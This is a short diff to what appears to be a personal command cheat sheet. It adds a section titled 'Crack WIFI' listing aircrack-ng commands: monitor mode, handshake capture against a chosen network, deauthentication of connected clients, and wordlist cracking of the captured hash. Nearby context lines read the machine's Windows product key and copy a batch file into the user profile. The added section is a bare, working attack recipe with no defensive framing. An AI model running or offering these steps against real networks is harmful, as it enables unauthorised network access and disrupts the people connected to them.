@@ -136,6 +136,19 @@ powershell -command "wmic path softwarelicensingservice get OA3xOriginalProductK
 
 ###################################################################################################################################
 
+Crack WIFI
+
+airmon-ng check kill
+pkill
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng --bssid ? -c ? --write hash wlan0
+
+aireplay-ng –0 2 –a ? –c ? wlan0
+aircrack-ng hash.cap -w /usr/share/wordlists/?
+
+###################################################################################################################################
+
 xcopy %~dp0\tmp.bat %userprofile%\
 
 or
